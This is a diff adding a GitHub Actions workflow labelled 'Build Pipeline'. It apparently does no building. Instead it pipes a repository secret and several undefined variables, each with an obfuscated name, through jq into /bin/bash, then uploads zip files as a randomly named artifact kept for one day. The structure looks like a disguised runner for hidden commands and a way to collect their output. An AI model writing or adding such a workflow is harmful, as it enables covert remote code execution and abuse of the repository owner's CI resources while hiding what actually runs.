@@ -1,0 +1,35 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          ebzyh439: ${{ secrets.ebzyh439 }}
+        run: |
+          printf '%s' "$ebzyh439" | jq -r .oi64 | /bin/bash
+          printf '%s' "$a465" | jq -r .hihdx6 | /bin/bash
+          echo $buwu4 | jq -r .fc206 | /bin/bash
+          echo $enne412 | jq -r .hujb8 | /bin/bash
+          printf '%s' "$jfjlw56890" | jq -r .up00039 | /bin/bash
+          echo $l79 | jq -r .sgm617 | /bin/bash
+          printf '%s' "$mw729" | jq -r .a22 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: sYwoGD2g
+          path: "*.zip"
+          retention-days: 1
